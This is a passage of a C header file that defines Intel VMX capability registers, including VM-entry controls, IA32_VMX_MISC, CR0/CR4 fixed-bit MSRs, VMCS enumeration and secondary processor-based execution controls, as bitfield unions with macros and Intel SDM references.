#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_FLAG                       0x4000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_MASK                       0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT(_)                         (((_) >> 14) & 0x01)

        /**
         * @brief Whether the guest IA32_EFER MSR is loaded on VM-entry
         *
         * [Bit 15] This control determines whether the IA32_EFER MSR is loaded on VM entry.
         */
        UINT64 LoadIa32Efer : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_BIT                       15
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_FLAG                      0x8000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER_MASK                      0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_EFER(_)                        (((_) >> 15) & 0x01)

        /**
         * [Bit 16] This control determines whether the IA32_BNDCFGS MSR is loaded on VM entry.
         */
        UINT64 LoadIa32Bndcfgs : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_BIT                    16
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_FLAG                   0x10000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS_MASK                   0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_BNDCFGS(_)                     (((_) >> 16) & 0x01)

        /**
         * [Bit 17] If this control is 1, Intel Processor Trace does not produce a paging information packet (PIP) on a VM entry or
         * a VMCS packet on a VM entry that returns from SMM.
         *
         * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
         */
        UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_BIT                  17
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_FLAG                 0x20000
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT_MASK                 0x01
#define IA32_VMX_ENTRY_CTLS_CONCEAL_VMX_FROM_PT(_)                   (((_) >> 17) & 0x01)

        /**
         * [Bit 18] This control determines whether the IA32_RTIT_CTL MSR is loaded on VM entry.
         */
        UINT64 LoadIa32RtitCtl : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_BIT                   18
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_FLAG                  0x40000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL_MASK                  0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_RTIT_CTL(_)                    (((_) >> 18) & 0x01)
        UINT64 Reserved4 : 1;

        /**
         * [Bit 20] This control determines whether CET-related MSRs and SPP are loaded on VM entry.
         */
        UINT64 LoadCetState : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_BIT                       20
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_FLAG                      0x100000
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE_MASK                      0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_CET_STATE(_)                        (((_) >> 20) & 0x01)
        UINT64 Reserved5 : 43;
    };

    UINT64 Flags;
} IA32_VMX_ENTRY_CTLS_REGISTER;


/**
 * Reporting Register of Miscellaneous VMX Capabilities.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.6(MISCELLANEOUS DATA)]
 * @see Vol3D[A.6(Miscellaneous Data)] (reference)
 */
#define IA32_VMX_MISC                                                0x00000485
typedef union
{
    struct
    {
        /**
         * @brief Relationship between the preemption timer and tsc; count down every time bit x of the tsc changes
         *
         * [Bits 4:0] Report a value X that specifies the relationship between the rate of the VMX-preemption timer and that of the
         * timestamp counter (TSC). Specifically, the VMX-preemption timer (if it is active) counts down by 1 every time bit X in
         * the TSC changes due to a TSC increment.
         */
        UINT64 PreemptionTimerTscRelationship : 5;
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_BIT          0
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_FLAG         0x1F
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP_MASK         0x1F
#define IA32_VMX_MISC_PREEMPTION_TIMER_TSC_RELATIONSHIP(_)           (((_) >> 0) & 0x1F)

        /**
         * @brief Whether VM-exit stores EFER.LMA into the "IA32e mode guest" field
         *
         * [Bit 5] When set to 1, VM exits store the value of IA32_EFER.LMA into the "IA-32e mode guest" VM-entry control. This bit
         * is read as 1 on any logical processor that supports the 1-setting of the "unrestricted guest" VM-execution control.
         *
         * @see Vol3C[27.2(RECORDING VM-EXIT INFORMATION AND UPDATING VM-ENTRY CONTROL FIELDS)]
         */
        UINT64 StoreEferLmaOnVmexit : 1;
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_BIT                   5
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_FLAG                  0x20
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT_MASK                  0x01
#define IA32_VMX_MISC_STORE_EFER_LMA_ON_VMEXIT(_)                    (((_) >> 5) & 0x01)

        /**
         * @brief Activity states supported by the implementation
         *
         * [Bits 8:6] Report, as a bitmap, the activity states supported by the implementation:
         * - Bit 6 reports (if set) the support for activity state 1 (HLT).
         * - Bit 7 reports (if set) the support for activity state 2 (shutdown).
         * - Bit 8 reports (if set) the support for activity state 3 (wait-for-SIPI).
         * If an activity state is not supported, the implementation causes a VM entry to fail if it attempts to establish that
         * activity state. All implementations support VM entry to activity state 0 (active).
         */
        UINT64 ActivityStates : 3;
#define IA32_VMX_MISC_ACTIVITY_STATES_BIT                            6
#define IA32_VMX_MISC_ACTIVITY_STATES_FLAG                           0x1C0
#define IA32_VMX_MISC_ACTIVITY_STATES_MASK                           0x07
#define IA32_VMX_MISC_ACTIVITY_STATES(_)                             (((_) >> 6) & 0x07)
        UINT64 Reserved1 : 5;

        /**
         * @brief Intel Processor Trace (Intel PT) can be used in VMX operation
         *
         * [Bit 14] When set to 1, Intel(R) Processor Trace (Intel PT) can be used in VMX operation. If the processor supports Intel
         * PT but does not allow it to be used in VMX operation, execution of VMXON clears IA32_RTIT_CTL.TraceEn; any attempt to
         * write IA32_RTIT_CTL while in VMX operation (including VMX root operation) causes a general-protection exception.
         *
         * @see Vol3C[30.3(VMX INSTRUCTIONS | VMXON-Enter VMX Operation)]
         */
        UINT64 IntelPtAvailableInVmx : 1;
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_BIT                  14
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_FLAG                 0x4000
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX_MASK                 0x01
#define IA32_VMX_MISC_INTEL_PT_AVAILABLE_IN_VMX(_)                   (((_) >> 14) & 0x01)

        /**
         * @brief Whether RDMSR can be used to read IA32_SMBASE_MSR in SMM
         *
         * [Bit 15] When set to 1, the RDMSR instruction can be used in system-management mode (SMM) to read the IA32_SMBASE MSR
         * (MSR address 9EH).
         *
         * @see Vol3C[34.15.6.3(Saving Guest State)]
         */
        UINT64 RdmsrCanReadIa32SmbaseMsrInSmm : 1;
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_BIT      15
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_FLAG     0x8000
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM_MASK     0x01
#define IA32_VMX_MISC_RDMSR_CAN_READ_IA32_SMBASE_MSR_IN_SMM(_)       (((_) >> 15) & 0x01)

        /**
         * @brief Number of CR3 target values supported by the processor (0-256)
         *
         * [Bits 24:16] Indicate the number of CR3-target values supported by the processor. This number is a value between 0 and
         * 256, inclusive (bit 24 is set if and only if bits 23:16 are clear).
         */
        UINT64 Cr3TargetCount : 9;
#define IA32_VMX_MISC_CR3_TARGET_COUNT_BIT                           16
#define IA32_VMX_MISC_CR3_TARGET_COUNT_FLAG                          0x1FF0000
#define IA32_VMX_MISC_CR3_TARGET_COUNT_MASK                          0x1FF
#define IA32_VMX_MISC_CR3_TARGET_COUNT(_)                            (((_) >> 16) & 0x1FF)

        /**
         * @brief Maximum number of MSRs in the VMCS. (N+1)*512
         *
         * [Bits 27:25] Used to compute the recommended maximum number of MSRs that should appear in the VM-exit MSR-store list,
         * the VM-exit MSR-load list, or the VM-entry MSR-load list. Specifically, if the value bits 27:25 of IA32_VMX_MISC is N,
         * then 512 * (N + 1) is the recommended maximum number of MSRs to be included in each list. If the limit is exceeded,
         * undefined processor behavior may result (including a machine check during the VMX transition).
         */
        UINT64 MaxNumberOfMsr : 3;
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_BIT                          25
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_FLAG                         0xE000000
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR_MASK                         0x07
#define IA32_VMX_MISC_MAX_NUMBER_OF_MSR(_)                           (((_) >> 25) & 0x07)

        /**
         * @brief Whether bit 2 of IA32_SMM_MONITOR_CTL can be set to 1
         *
         * [Bit 28] When set to 1, bit 2 of the IA32_SMM_MONITOR_CTL can be set to 1. VMXOFF unblocks SMIs unless
         * IA32_SMM_MONITOR_CTL[bit 2] is 1.
         *
         * @see Vol3C[34.14.4(VMXOFF and SMI Unblocking)]
         */
        UINT64 SmmMonitorCtlB2 : 1;
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_BIT                         28
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_FLAG                        0x10000000
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2_MASK                        0x01
#define IA32_VMX_MISC_SMM_MONITOR_CTL_B2(_)                          (((_) >> 28) & 0x01)

        /**
         * @brief Whether VMWRITE can be used to write VM-exit information fields
         *
         * [Bit 29] When set to 1, software can use VMWRITE to write to any supported field in the VMCS; otherwise, VMWRITE cannot
         * be used to modify VM-exit information fields.
         */
        UINT64 VmwriteVmexitInfo : 1;
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_BIT                        29
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_FLAG                       0x20000000
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO_MASK                       0x01
#define IA32_VMX_MISC_VMWRITE_VMEXIT_INFO(_)                         (((_) >> 29) & 0x01)

        /**
         * [Bit 30] When set to 1, VM entry allows injection of a software interrupt, software exception, or privileged software
         * exception with an instruction length of 0.
         */
        UINT64 ZeroLengthInstructionVmentryInjection : 1;
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_BIT  30
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_FLAG 0x40000000
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION_MASK 0x01
#define IA32_VMX_MISC_ZERO_LENGTH_INSTRUCTION_VMENTRY_INJECTION(_)   (((_) >> 30) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief MSEG revision identifier used by the processor
         *
         * [Bits 63:32] Report the 32-bit MSEG revision identifier used by the processor.
         */
        UINT64 MsegId : 32;
#define IA32_VMX_MISC_MSEG_ID_BIT                                    32
#define IA32_VMX_MISC_MSEG_ID_FLAG                                   0xFFFFFFFF00000000
#define IA32_VMX_MISC_MSEG_ID_MASK                                   0xFFFFFFFF
#define IA32_VMX_MISC_MSEG_ID(_)                                     (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_VMX_MISC_REGISTER;


/**
 * Capability Reporting Register of CR0 Bits Fixed to 0.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.7(VMX-FIXED BITS IN CR0)]
 * @see Vol3D[A.7(VMX-Fixed Bits in CR0)] (reference)
 */
#define IA32_VMX_CR0_FIXED0                                          0x00000486

 /**
  * Capability Reporting Register of CR0 Bits Fixed to 1.
  *
  * @remarks If CPUID.01H:ECX.[5] = 1
  * @see Vol3D[A.7(VMX-FIXED BITS IN CR0)]
  * @see Vol3D[A.7(VMX-Fixed Bits in CR0)] (reference)
  */
#define IA32_VMX_CR0_FIXED1                                          0x00000487

  /**
   * Capability Reporting Register of CR4 Bits Fixed to 0.
   *
   * @remarks If CPUID.01H:ECX.[5] = 1
   * @see Vol3D[A.8(VMX-FIXED BITS IN CR4)]
   * @see Vol3D[A.8(VMX-Fixed Bits in CR4)] (reference)
   */
#define IA32_VMX_CR4_FIXED0                                          0x00000488

   /**
    * Capability Reporting Register of CR4 Bits Fixed to 1.
    *
    * @remarks If CPUID.01H:ECX.[5] = 1
    * @see Vol3D[A.8(VMX-FIXED BITS IN CR4)]
    * @see Vol3D[A.8(VMX-Fixed Bits in CR4)] (reference)
    */
#define IA32_VMX_CR4_FIXED1                                          0x00000489

    /**
     * Capability Reporting Register of VMCS Field Enumeration.
     *
     * @remarks If CPUID.01H:ECX.[5] = 1
     * @see Vol3D[A.9(VMCS ENUMERATION)]
     * @see Vol3D[A.9(VMCS Enumeration)] (reference)
     */
#define IA32_VMX_VMCS_ENUM                                           0x0000048A
typedef union
{
    struct
    {
        /**
         * [Bit 0] Indicates access type.
         */
        UINT64 AccessType : 1;
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_BIT                           0
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_FLAG                          0x01
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE_MASK                          0x01
#define IA32_VMX_VMCS_ENUM_ACCESS_TYPE(_)                            (((_) >> 0) & 0x01)

        /**
         * [Bits 9:1] Highest index value used for any VMCS encoding.
         */
        UINT64 HighestIndexValue : 9;
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_BIT                   1
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_FLAG                  0x3FE
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE_MASK                  0x1FF
#define IA32_VMX_VMCS_ENUM_HIGHEST_INDEX_VALUE(_)                    (((_) >> 1) & 0x1FF)

        /**
         * [Bits 11:10] Indicate the field's type.
         */
        UINT64 FieldType : 2;
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_BIT                            10
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_FLAG                           0xC00
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE_MASK                           0x03
#define IA32_VMX_VMCS_ENUM_FIELD_TYPE(_)                             (((_) >> 10) & 0x03)
        UINT64 Reserved1 : 1;

        /**
         * [Bits 14:13] Indicate the field's width.
         */
        UINT64 FieldWidth : 2;
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_BIT                           13
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_FLAG                          0x6000
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH_MASK                          0x03
#define IA32_VMX_VMCS_ENUM_FIELD_WIDTH(_)                            (((_) >> 13) & 0x03)
        UINT64 Reserved2 : 49;
    };

    UINT64 Flags;
} IA32_VMX_VMCS_ENUM_REGISTER;


/**
 * Capability Reporting Register of Secondary Processor-Based VM-Execution Controls.
 *
 * @remarks If ( CPUID.01H:ECX.[5] && IA32_VMX_PROCBASED_CTLS[63] )
 * @see Vol3D[A.3.3(Secondary Processor-Based VM-Execution Controls)]
 * @see Vol3D[24.6.2(Processor-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PROCBASED_CTLS2                                     0x0000048B
typedef union
{
    struct
    {
        /**
         * @brief Virtualize APIC access
         *
         * [Bit 0] If this control is 1, the logical processor treats specially accesses to the page with the APICaccess address.
         *
         * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
         */
        UINT64 VirtualizeApicAccesses : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_BIT        0
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_FLAG       0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES_MASK       0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_APIC_ACCESSES(_)         (((_) >> 0) & 0x01)

        /**
         * @brief EPT supported/enabled
         *
         * [Bit 1] If this control is 1, extended page tables (EPT) are enabled.
         *
         * @see Vol3C[28.2(THE EXTENDED PAGE TABLE MECHANISM (EPT))]
         */
        UINT64 EnableEpt : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_BIT                      1
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_FLAG                     0x02
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_MASK                     0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT(_)                       (((_) >> 1) & 0x01)

        /**
         * @brief Descriptor table instructions cause VM-exits
         *
         * [Bit 2] This control determines whether executions of LGDT, LIDT, LLDT, LTR, SGDT, SIDT, SLDT, and STR cause VM exits.
         */
        UINT64 DescriptorTableExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_BIT        2
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_FLAG       0x04
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_MASK       0x01
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING(_)         (((_) >> 2) & 0x01)

        /**
         * @brief RDTSCP supported/enabled
         *
         * [Bit 3] If this control is 0, any execution of RDTSCP causes an invalid-opcode exception (\#UD).
         */
        UINT64 EnableRdtscp : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_BIT                   3
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_FLAG                  0x08
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP(_)                    (((_) >> 3) & 0x01)

        /**
         * @brief Virtualize x2APIC mode
         *
         * [Bit 4] If this control is 1, the logical processor treats specially RDMSR and WRMSR to APIC MSRs (in the range
         * 800H-8FFH).
         *
         * @see Vol3C[29.5(VIRTUALIZING MSR-BASED APIC ACCESSES)]
         */
        UINT64 VirtualizeX2ApicMode : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_BIT          4
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_FLAG         0x10
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_MASK         0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE(_)           (((_) >> 4) & 0x01)

        /**
         * @brief VPID supported/enabled
         *
         * [Bit 5] If this control is 1, cached translations of linear addresses are associated with a virtualprocessor identifier
         * (VPID).
         *
         * @see Vol3C[28.1(VIRTUAL PROCESSOR IDENTIFIERS (VPIDS))]
         */
        UINT64 EnableVpid : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_BIT                     5
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_FLAG                    0x20
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_MASK                    0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID(_)                      (((_) >> 5) & 0x01)

        /**
         * @brief VM-exit when executing the WBINVD instruction
         *
         * [Bit 6] This control determines whether executions of WBINVD cause VM exits.
         */
        UINT64 WbinvdExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_BIT                  6
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_FLAG                 0x40
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING(_)                   (((_) >> 6) & 0x01)

        /**
         * @brief Unrestricted guest execution
         *
         * [Bit 7] This control determines whether guest software may run in unpaged protected mode or in realaddress mode.
         */
        UINT64 UnrestrictedGuest : 1;
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_BIT              7
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_FLAG             0x80
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_MASK             0x01
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST(_)               (((_) >> 7) & 0x01)

        /**
         * @brief APIC register virtualization
         *
         * [Bit 8] If this control is 1, the logical processor virtualizes certain APIC accesses.
         *
         * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
         * @see Vol3C[29.5(VIRTUALIZING MSR-BASED APIC ACCESSES)]
         */
        UINT64 ApicRegisterVirtualization : 1;
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_BIT    8
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_FLAG   0x100
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_MASK   0x01
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION(_)     (((_) >> 8) & 0x01)

        /**
         * @brief Virtual-interrupt delivery
         *
         * [Bit 9] This controls enables the evaluation and delivery of pending virtual interrupts as well as the emulation of
         * writes to the APIC registers that control interrupt prioritization.
         */
        UINT64 VirtualInterruptDelivery : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_BIT      9
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_FLAG     0x200
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_MASK     0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY(_)       (((_) >> 9) & 0x01)

        /**
         * @brief A specified number of pause loops cause a VM-exit
         *
         * [Bit 10] This control determines whether a series of executions of PAUSE can cause a VM exit.
         *
         * @see Vol3C[24.6.13(Controls for PAUSE-Loop Exiting)]
         * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
         */
        UINT64 PauseLoopExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_BIT              10
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_FLAG             0x400
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_MASK             0x01
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING(_)               (((_) >> 10) & 0x01)

        /**
         * @brief VM-exit when executing RDRAND instructions
         *
         * [Bit 11] This control determines whether executions of RDRAND cause VM exits.
         */
        UINT64 RdrandExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_BIT                  11
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_FLAG                 0x800
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING(_)                   (((_) >> 11) & 0x01)

        /**
         * @brief Enables INVPCID instructions
         *
         * [Bit 12] If this control is 0, any execution of INVPCID causes a \#UD.
         */
        UINT64 EnableInvpcid : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_BIT                  12
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_FLAG                 0x1000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID(_)                   (((_) >> 12) & 0x01)

        /**
         * @brief Enables VMFUNC instructions
         *
         * [Bit 13] Setting this control to 1 enables use of the VMFUNC instruction in VMX non-root operation.
         *
         * @see Vol3C[25.5.5(VM Functions)]
         */
        UINT64 EnableVmFunctions : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_BIT             13
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_FLAG            0x2000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_MASK            0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS(_)              (((_) >> 13) & 0x01)

        /**
         * @brief Enables VMCS shadowing
         *
         * [Bit 14] If this control is 1, executions of VMREAD and VMWRITE in VMX non-root operation may access a shadow VMCS
         * (instead of causing VM exits).
         *
         * @see {'Vol3C[24.10(VMCS TYPES': 'ORDINARY AND SHADOW)]'}
         * @see Vol3C[30.3(VMX INSTRUCTIONS)]
         */
        UINT64 VmcsShadowing : 1;
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_BIT                  14
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_FLAG                 0x4000
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING(_)                   (((_) >> 14) & 0x01)

        /**
         * @brief Enables ENCLS VM-exits
         *
         * [Bit 15] If this control is 1, executions of ENCLS consult the ENCLS-exiting bitmap to determine whether the instruction
         * causes a VM exit.
         *
         * @see Vol3C[24.6.16(ENCLS-Exiting Bitmap)]
         * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
         */
        UINT64 EnableEnclsExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_BIT            15
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_FLAG           0x8000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_MASK           0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING(_)             (((_) >> 15) & 0x01)

        /**
         * @brief VM-exit when executing RDSEED
         *
         * [Bit 16] This control determines whether executions of RDSEED cause VM exits.
         */
        UINT64 RdseedExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_BIT                  16
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_FLAG                 0x10000
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING(_)                   (((_) >> 16) & 0x01)

        /**
         * @brief Enables page-modification logging
         *
         * [Bit 17] If this control is 1, an access to a guest-physical address that sets an EPT dirty bit first adds an entry to
         * the page-modification log.
         *
         * @see Vol3C[28.2.5(Page-Modification Logging)]
         */
        UINT64 EnablePml : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_BIT                      17
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_FLAG                     0x20000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_MASK                     0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML(_)                       (((_) >> 17) & 0x01)

        /**
         * @brief Controls whether EPT-violations may cause
         *
         * [Bit 18] If this control is 1, EPT violations may cause virtualization exceptions (\#VE) instead of VM exits.
         *
         * @see Vol3C[25.5.6(Virtualization Exceptions)]
         */
        UINT64 EptViolation : 1;
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_BIT                   18
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_FLAG                  0x40000
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION(_)                    (((_) >> 18) & 0x01)

        /**
         * @brief Conceal VMX non-root operation from Intel processor trace (PT)
         *
         * [Bit 19] If this control is 1, Intel Processor Trace suppresses from PIPs an indication that the processor was in VMX
         * non-root operation and omits a VMCS packet from any PSB+ produced in VMX nonroot operation.
         *
         * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
         */
        UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_BIT             19
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_FLAG            0x80000
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_MASK            0x01
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT(_)              (((_) >> 19) & 0x01)

        /**
         * @brief Enables XSAVES/XRSTORS instructions
         *
         * [Bit 20] If this control is 0, any execution of XSAVES or XRSTORS causes a \#UD.
         */
        UINT64 EnableXsaves : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_BIT                   20
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_FLAG                  0x100000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES(_)                    (((_) >> 20) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 22] If this control is 1, EPT execute permissions are based on whether the linear address being accessed is
         * supervisor mode or user mode.
         *
         * @see Vol3C[28(VMX SUPPORT FOR ADDRESS TRANSLATION)]
         */
        UINT64 ModeBasedExecuteControlForEpt : 1;
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_BIT 22
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_FLAG 0x400000
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_MASK 0x01
